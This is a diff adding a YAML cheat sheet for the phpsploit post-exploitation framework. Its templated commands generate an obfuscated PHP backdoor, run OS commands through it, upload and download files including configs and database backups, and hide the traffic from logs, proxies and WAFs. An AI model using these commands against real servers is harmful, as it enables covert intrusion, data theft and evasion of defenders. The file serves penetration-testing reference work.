@@ -1,0 +1,91 @@
+tool: phpsploit
+tags: [web, post-exploitation, php, shell, security, pentest, stealth, backdoor]
+
+actions:
+  # === INITIALIZATION & SETUP ===
+  - title: phpsploit - generate stealth backdoor
+    desc: |
+      Generates the obfuscated PHP backdoor code that needs to be uploaded to the target server.
+      This script acts as the server-side component of the framework, enabling stealthy communication via HTTP headers.
+      You can specify the output path to save the generated code directly to a file for later deployment.
+    command: "phpsploit -e \"backdoor --output {{output_path|backdoor.php}}\""
+
+  - title: phpsploit - display backdoor code
+    desc: |
+      Displays the PHP backdoor code directly in the terminal without saving it to a file.
+      This is useful if you want to manually copy-paste the code into an existing file on the target or a web-based file manager.
+      The generated code is highly obfuscated to bypass simple pattern-matching security solutions.
+    command: "phpsploit -e \"backdoor\""
+
+  # === CONNECTION & SESSIONS ===
+  - title: phpsploit - connect to target
+    desc: |
+      Establishes an interactive connection to the pre-deployed PHP backdoor on the remote server.
+      This command initiates the handshake process and opens a command-line interface for further exploitation.
+      Make sure the URL provided is the exact path where the phpsploit backdoor is hosted.
+    command: "phpsploit --target {{url}}"
+
+  - title: phpsploit - load session
+    desc: |
+      Resumes a previously saved session from a local file.
+      This allows you to maintain persistence across different work sessions without losing configuration or target history.
+      Sessions contain information about the target URL, environment variables, and custom settings used during the last interaction.
+    command: "phpsploit --load {{session_file}}"
+
+  - title: phpsploit - run commands from file
+    desc: |
+      Executes a series of phpsploit commands stored in a local text file against the target.
+      This is ideal for automating repetitive tasks such as initial environment enumeration or automated cleanup.
+      The interactive mode is disabled by default when using this flag unless forced otherwise.
+    command: "phpsploit --target {{url}} --source {{script_file}}"
+
+  # === POST-EXPLOITATION ACTIONS ===
+  - title: phpsploit - system command execution
+    desc: |
+      Executes a native operating system command on the remote server through the PHP backdoor.
+      The results are returned through the obfuscated channel, minimizing the footprint in web server access logs.
+      Always check the current user's privileges before attempting sensitive commands to avoid unnecessary detection.
+    command: "phpsploit -e \"run {{system_command|id}}\" --target {{url}}"
+
+  - title: phpsploit - upload file
+    desc: |
+      Transfers a file from the local attacker machine to the remote compromised server.
+      This is critical for deploying privilege escalation scripts, static binaries, or other post-exploitation tools.
+      The transfer is handled via the stealthy HTTP tunnel, making it harder to detect compared to standard FTP or HTTP uploads.
+    command: "phpsploit -e \"upload {{local_path}} {{remote_path}}\" --target {{url}}"
+
+  - title: phpsploit - download file
+    desc: |
+      Downloads a file from the target server to your local machine for analysis or exfiltration.
+      Use this to grab configuration files, database backups, or sensitive source code from the web root.
+      The tool ensures that the file content is retrieved securely through the established obfuscated medium.
+    command: "phpsploit -e \"download {{remote_path}} {{local_path}}\" --target {{url}}"
+
+  - title: phpsploit - gather system information
+    desc: |
+      Collects detailed information about the target's operating system, PHP environment, and hardware.
+      This helps in identifying potential local privilege escalation vulnerabilities and understanding the environment's limitations.
+      It provides data such as the OS kernel version, PHP version, and lists of disabled PHP functions.
+    command: "phpsploit -e \"info\" --target {{url}}"
+
+  # === STEALTH & CONFIGURATION ===
+  - title: phpsploit - connection via proxy
+    desc: |
+      Routes all phpsploit traffic through a specified proxy server (SOCKS or HTTP).
+      This is essential for anonymizing your activity or bypassing network restrictions that might block direct outgoing connections.
+      Ensure the proxy is active and reachable before attempting to connect to the target.
+    command: "phpsploit -e \"set proxy {{proxy_url|http://127.0.0.1:8080}}\" --target {{url}}"
+
+  - title: phpsploit - set custom user-agent
+    desc: |
+      Changes the User-Agent string used by phpsploit to mimic a legitimate web browser.
+      Customizing this value helps the backdoor traffic blend in with normal user activity in the web server's logs.
+      Using a common browser string is a standard practice for staying stealthy during long-term engagements.
+    command: "phpsploit -e \"set user-agent {{user_agent|Mozilla/5.0 (Windows NT 10.0; Win64; x64)}}\" --target {{url}}"
+
+  - title: phpsploit - set custom request header
+    desc: |
+      Adds or modifies custom HTTP headers for the communication between the client and the backdoor.
+      This can be used to bypass certain WAF rules or to match specific traffic patterns expected by the target environment.
+      Setting headers like 'X-Forwarded-For' might also be useful in specific network configurations.
+    command: "phpsploit -e \"set {{header_name|X-Custom-Header}} {{header_value}}\" --target {{url}}"
